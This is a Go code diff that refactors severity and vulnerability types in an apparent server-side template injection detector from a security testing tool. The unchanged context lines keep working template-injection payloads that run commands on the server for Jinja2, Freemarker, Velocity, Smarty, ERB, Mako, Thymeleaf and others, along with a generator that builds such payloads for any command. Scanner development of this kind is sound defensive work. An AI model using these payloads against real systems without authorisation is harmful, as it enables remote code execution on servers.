@@ -17,6 +17,7 @@ import (
 
 	"github.com/waftester/waftester/pkg/defaults"
 	"github.com/waftester/waftester/pkg/duration"
+	"github.com/waftester/waftester/pkg/finding"
 	"github.com/waftester/waftester/pkg/httpclient"
 	"github.com/waftester/waftester/pkg/iohelper"
 )
@@ -43,17 +44,6 @@ const (
 	EngineUnknown    TemplateEngine = "unknown"
 )
 
-// Severity represents the severity level of a finding
-type Severity string
-
-const (
-	SeverityCritical Severity = "critical"
-	SeverityHigh     Severity = "high"
-	SeverityMedium   Severity = "medium"
-	SeverityLow      Severity = "low"
-	SeverityInfo     Severity = "info"
-)
-
 // PayloadType represents the type of SSTI payload
 type PayloadType string
 
@@ -75,7 +65,7 @@ type Payload struct {
 	ExpectedOutput string         // Expected output if vulnerable
 	Regex          *regexp.Regexp // Regex pattern to match in response
 	Description    string         // Description of what this payload does
-	Severity       Severity       // Severity if successful
+	Severity       finding.Severity // Severity if successful
 	MathA          int            // First number for math probes
 	MathB          int            // Second number for math probes
 	MathResult     int            // Expected result for math probes
@@ -83,17 +73,12 @@ type Payload struct {
 
 // Vulnerability represents a detected SSTI vulnerability
 type Vulnerability struct {
-	URL            string         // Vulnerable URL
-	Parameter      string         // Vulnerable parameter
-	Engine         TemplateEngine // Detected template engine
-	Payload        *Payload       // Payload that triggered the vuln
-	Evidence       string         // Response evidence
-	Confidence     string         // high, medium, low
-	Severity       Severity       // Severity level
-	ResponseTime   time.Duration  // Response time
-	CanExecuteCode bool           // Whether RCE is possible
-	RCEPayload     string         // Example RCE payload
-	ConfirmedBy    int            // Number of confirming payloads
+	finding.Vulnerability
+	Engine         TemplateEngine `json:"engine"`          // Detected template engine
+	Payload        *Payload       `json:"payload,omitempty"` // Payload that triggered the vuln
+	Confidence     string         `json:"confidence"`      // high, medium, low
+	CanExecuteCode bool           `json:"can_execute_code"` // Whether RCE is possible
+	RCEPayload     string         `json:"rce_payload,omitempty"` // Example RCE payload
 }
 
 // DetectorConfig configures the SSTI detector
@@ -225,7 +210,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Jinja2 basic math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -236,7 +221,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Jinja2 spaced math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -247,7 +232,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Jinja2 print statement",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -259,7 +244,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:           PayloadProbe,
 			ExpectedOutput: "7777777",
 			Description:    "Jinja2 string multiplication",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 		},
 		{
 			Template:    "{{config}}",
@@ -267,7 +252,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`(?i)config|secret|debug`),
 			Description: "Jinja2 config object access",
-			Severity:    SeverityMedium,
+			Severity:    finding.Medium,
 		},
 		{
 			Template:    "{{self}}",
@@ -275,7 +260,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`(?i)template|object|context`),
 			Description: "Jinja2 self object access",
-			Severity:    SeverityMedium,
+			Severity:    finding.Medium,
 		},
 		{
 			Template:    "{{request.environ}}",
@@ -283,7 +268,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`(?i)environ|wsgi|server`),
 			Description: "Jinja2 request environ access",
-			Severity:    SeverityMedium,
+			Severity:    finding.Medium,
 		},
 	}
 
@@ -296,7 +281,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 				Type:        PayloadSandboxEscape,
 				Regex:       regexp.MustCompile(`(?i)subprocess|popen|os`),
 				Description: "Jinja2 sandbox escape - class enumeration",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    "{{lipsum.__globals__['os'].popen('id').read()}}",
@@ -304,7 +289,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Jinja2 RCE via lipsum globals",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
@@ -312,7 +297,7 @@ func (d *Detector) jinja2Payloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Jinja2 RCE via cycler globals",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -330,7 +315,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Freemarker math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -341,7 +326,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Freemarker hash math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -352,7 +337,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Freemarker square bracket expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -363,7 +348,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`(?i)model|data|hash`),
 			Description: "Freemarker data model access",
-			Severity:    SeverityMedium,
+			Severity:    finding.Medium,
 		},
 	}
 
@@ -375,7 +360,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Freemarker RCE via Execute",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `${"freemarker.template.utility.Execute"?new()("id")}`,
@@ -383,7 +368,7 @@ func (d *Detector) freemarkerPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Freemarker RCE inline Execute",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -401,7 +386,7 @@ func (d *Detector) velocityPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Velocity set and output",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -412,7 +397,7 @@ func (d *Detector) velocityPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: fmt.Sprintf("%d", a+b),
 			Description:    "Velocity Math reflection",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 		},
 	}
 
@@ -423,14 +408,14 @@ func (d *Detector) velocityPayloads(a, b, result int) []*Payload {
 				Engine:      EngineVelocity,
 				Type:        PayloadRCE,
 				Description: "Velocity RCE via Runtime",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()`,
 				Engine:      EngineVelocity,
 				Type:        PayloadRCE,
 				Description: "Velocity RCE inline Runtime",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -448,7 +433,7 @@ func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Smarty math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -459,7 +444,7 @@ func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Smarty math tag",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -470,7 +455,7 @@ func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`[0-9]+\.[0-9]+`),
 			Description: "Smarty version disclosure",
-			Severity:    SeverityLow,
+			Severity:    finding.Low,
 		},
 	}
 
@@ -482,14 +467,14 @@ func (d *Detector) smartyPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Smarty RCE via php tag (Smarty < 3)",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}`,
 				Engine:      EngineSmarty,
 				Type:        PayloadRCE,
 				Description: "Smarty RCE via file write",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -507,7 +492,7 @@ func (d *Detector) makoPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Mako math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -518,7 +503,7 @@ func (d *Detector) makoPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Mako Python block",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -533,7 +518,7 @@ func (d *Detector) makoPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Mako RCE via os import",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `${self.module.cache.util.os.popen('id').read()}`,
@@ -541,7 +526,7 @@ func (d *Detector) makoPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Mako RCE via module cache",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -559,7 +544,7 @@ func (d *Detector) erbPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "ERB math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -570,7 +555,7 @@ func (d *Detector) erbPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "ERB string interpolation",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -585,7 +570,7 @@ func (d *Detector) erbPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "ERB RCE via system",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    "<%= `id` %>",
@@ -593,7 +578,7 @@ func (d *Detector) erbPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "ERB RCE via backticks",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `<%= IO.popen('id').read() %>`,
@@ -601,7 +586,7 @@ func (d *Detector) erbPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "ERB RCE via IO.popen",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -619,7 +604,7 @@ func (d *Detector) pebblePayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Pebble math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -634,7 +619,7 @@ func (d *Detector) pebblePayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Pebble RCE via filter",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -652,7 +637,7 @@ func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Thymeleaf inline expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -663,7 +648,7 @@ func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Thymeleaf preprocessing",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -677,14 +662,14 @@ func (d *Detector) thymeleafPayloads(a, b, result int) []*Payload {
 				Engine:      EngineThymeleaf,
 				Type:        PayloadRCE,
 				Description: "Thymeleaf RCE via Runtime",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 			{
 				Template:    `__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()%7d__`,
 				Engine:      EngineThymeleaf,
 				Type:        PayloadRCE,
 				Description: "Thymeleaf RCE URL encoded",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -702,7 +687,7 @@ func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Nunjucks math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -713,7 +698,7 @@ func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Nunjucks spaced math",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -724,7 +709,7 @@ func (d *Detector) nunjucksPayloads(a, b, result int) []*Payload {
 			Type:        PayloadRCE,
 			Regex:       regexp.MustCompile(`uid=|gid=`),
 			Description: "Nunjucks RCE via constructor",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 	}
 }
@@ -737,7 +722,7 @@ func (d *Detector) handlebarsPayloads(a, b, result int) []*Payload {
 			Type:        PayloadRCE,
 			Regex:       regexp.MustCompile(`uid=|gid=`),
 			Description: "Handlebars RCE via prototype pollution",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 	}
 }
@@ -752,7 +737,7 @@ func (d *Detector) tornadoPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Tornado math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -767,7 +752,7 @@ func (d *Detector) tornadoPayloads(a, b, result int) []*Payload {
 				Type:        PayloadRCE,
 				Regex:       regexp.MustCompile(`uid=|gid=`),
 				Description: "Tornado RCE via import",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -783,14 +768,14 @@ func (d *Detector) djangoPayloads(a, b, result int) []*Payload {
 			Type:        PayloadInfoDisclosure,
 			Regex:       regexp.MustCompile(`(?i)secret|debug|database`),
 			Description: "Django settings disclosure",
-			Severity:    SeverityMedium,
+			Severity:    finding.Medium,
 		},
 		{
 			Template:    "{{debug}}",
 			Engine:      EngineDjango,
 			Type:        PayloadInfoDisclosure,
 			Description: "Django debug mode check",
-			Severity:    SeverityLow,
+			Severity:    finding.Low,
 		},
 	}
 }
@@ -805,7 +790,7 @@ func (d *Detector) razorPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Razor math expression",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -819,7 +804,7 @@ func (d *Detector) razorPayloads(a, b, result int) []*Payload {
 				Engine:      EngineRazor,
 				Type:        PayloadRCE,
 				Description: "Razor RCE via Process",
-				Severity:    SeverityCritical,
+				Severity:    finding.Critical,
 			},
 		}...)
 	}
@@ -838,7 +823,7 @@ func (d *Detector) universalPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Universal curly brace math (Jinja2/Twig/Tornado)",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -849,7 +834,7 @@ func (d *Detector) universalPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Universal dollar brace math (Freemarker/Mako)",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -860,7 +845,7 @@ func (d *Detector) universalPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Universal ERB-style math",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -871,7 +856,7 @@ func (d *Detector) universalPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Universal single brace math (Smarty)",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -882,7 +867,7 @@ func (d *Detector) universalPayloads(a, b, result int) []*Payload {
 			Type:           PayloadMath,
 			ExpectedOutput: resultStr,
 			Description:    "Universal dollar double brace (Thymeleaf)",
-			Severity:       SeverityHigh,
+			Severity:       finding.High,
 			MathA:          a,
 			MathB:          b,
 			MathResult:     result,
@@ -1088,14 +1073,16 @@ func (d *Detector) analyzeResponse(targetURL, parameter string, payload *Payload
 	}
 
 	return &Vulnerability{
-		URL:            targetURL,
-		Parameter:      parameter,
+		Vulnerability: finding.Vulnerability{
+			URL:          targetURL,
+			Parameter:    parameter,
+			Severity:     payload.Severity,
+			Evidence:     evidence,
+			ResponseTime: elapsed,
+		},
 		Engine:         payload.Engine,
 		Payload:        payload,
-		Evidence:       evidence,
 		Confidence:     confidence,
-		Severity:       payload.Severity,
-		ResponseTime:   elapsed,
 		CanExecuteCode: payload.Type == PayloadRCE,
 	}
 }
@@ -1136,14 +1123,16 @@ func (d *Detector) DetectBlind(ctx context.Context, targetURL string, parameter 
 		delay := payloadTime - baselineTime
 		if delay >= d.config.BlindDelay-time.Second {
 			vulns = append(vulns, &Vulnerability{
-				URL:          targetURL,
-				Parameter:    parameter,
-				Engine:       payload.Engine,
-				Payload:      payload,
-				Evidence:     fmt.Sprintf("Time-based delay detected: baseline=%v, payload=%v, delta=%v", baselineTime, payloadTime, delay),
-				Confidence:   "medium",
-				Severity:     SeverityHigh,
-				ResponseTime: payloadTime,
+				Vulnerability: finding.Vulnerability{
+					URL:          targetURL,
+					Parameter:    parameter,
+					Severity:     finding.High,
+					Evidence:     fmt.Sprintf("Time-based delay detected: baseline=%v, payload=%v, delta=%v", baselineTime, payloadTime, delay),
+					ResponseTime: payloadTime,
+				},
+				Engine:     payload.Engine,
+				Payload:    payload,
+				Confidence: "medium",
 			})
 		}
 	}
@@ -1161,7 +1150,7 @@ func (d *Detector) getBlindPayloads() []*Payload {
 			Engine:      EngineJinja2,
 			Type:        PayloadBlind,
 			Description: "Jinja2 blind time-based",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 		// Freemarker blind
 		{
@@ -1169,7 +1158,7 @@ func (d *Detector) getBlindPayloads() []*Payload {
 			Engine:      EngineFreemarker,
 			Type:        PayloadBlind,
 			Description: "Freemarker blind time-based",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 		// ERB blind
 		{
@@ -1177,7 +1166,7 @@ func (d *Detector) getBlindPayloads() []*Payload {
 			Engine:      EngineERB,
 			Type:        PayloadBlind,
 			Description: "ERB blind time-based",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 		// Mako blind
 		{
@@ -1185,7 +1174,7 @@ func (d *Detector) getBlindPayloads() []*Payload {
 			Engine:      EngineMako,
 			Type:        PayloadBlind,
 			Description: "Mako blind time-based",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 	}
 }
@@ -1378,7 +1367,7 @@ func (g *PayloadGenerator) GenerateMathPayload(a, b int) *Payload {
 		Type:           PayloadMath,
 		ExpectedOutput: resultStr,
 		Description:    fmt.Sprintf("Custom math payload for %s", g.engine),
-		Severity:       SeverityHigh,
+		Severity:       finding.High,
 		MathA:          a,
 		MathB:          b,
 		MathResult:     result,
@@ -1408,7 +1397,7 @@ func (g *PayloadGenerator) GenerateRCEPayload(command string) *Payload {
 		Engine:      g.engine,
 		Type:        PayloadRCE,
 		Description: fmt.Sprintf("RCE payload executing: %s", command),
-		Severity:    SeverityCritical,
+		Severity:    finding.Critical,
 	}
 }
 
